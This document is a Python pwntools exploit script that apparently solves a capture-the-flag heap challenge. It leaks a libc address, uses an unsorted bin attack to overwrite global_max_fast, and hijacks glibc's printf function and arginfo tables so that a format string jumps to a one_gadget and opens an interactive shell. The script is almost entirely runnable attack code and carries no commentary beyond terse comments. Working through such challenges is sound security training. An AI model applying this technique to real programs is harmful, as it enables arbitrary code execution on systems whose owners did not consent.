from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
binary='./errorProgram.dms'
elf=ELF(binary)
debug=1
if debug:
    io=process(binary)
else:
    io = remote("error-program.ctf.defenit.kr",7777)
onegadgets=[0x4f2c5,0x4f322,0x10a38c]
libc = ELF("./libc-2.27.so")
s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)

def malloc(idx,size):
    ru('YOUR CHOICE? :')
    sl('1')
    ru('INDEX? :')
    sl(str(idx))
    ru('SIZE? :')
    sl(str(size))#size <= 0x776 || size > 0x77777
def free(idx):
    ru('YOUR CHOICE? :')
    sl('2')
    ru('INDEX? :')
    sl(str(idx))

def edit(idx,data):
    ru('YOUR CHOICE? :')
    sl('3')
    ru('INDEX? :')
    sl(str(idx))
    ru("DATA : ")
    sl(data)

def view(idx):
    ru('YOUR CHOICE? :')
    sl('4')
    ru('INDEX? :')
    sl(str(idx))
    ru("DATA : ")

def say(payload):
    ru('YOUR CHOICE? :')
    sl('1')
    ru('Input your payload : ')
    sl(str(payload))

#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0x10a38c

MAIN_ARENA      = 0x3ebc40
MAIN_ARENA_DELTA= 0x60
GLOBAL_MAX_FAST = 0x3ed940
PRINTF_FUNCTABLE= 0x3f0658
PRINTF_ARGINFO  = 0x3ec870 #__printf_arginfo_table
offset2size=lambda ofs:((ofs) * 2 - 0x10) 

ru('YOUR CHOICE? :')
sl('3')
malloc(0,0x800)
malloc(1,offset2size(PRINTF_FUNCTABLE - MAIN_ARENA))
malloc(2,offset2size(PRINTF_ARGINFO - MAIN_ARENA))
#leak libc
free(0)
view(0)
libc.address=u64(r(8))-0x3ebca0
print(hex(libc.address))

#unsorted bin attack step 1
global_max_fast=0x3ed940
c=b''
c+=p64(0)
c+=p64(libc.address+global_max_fast-0x10)
edit(0,c)

#'%x' => onegadget
c=b''
c=c.ljust((ord('x')-2)*8)
c+=p64(libc.address+onegadgets[2])
edit(2,c)

#unsorted bin attack step 2
malloc(3,0x800)


free(1)#__printf_function_table => heap chunk 1
free(2)#__printf_arginfo_table => heap chunk 2
ru('YOUR CHOICE? :')
sl('5')
say('X'*0x108)
io.interactive()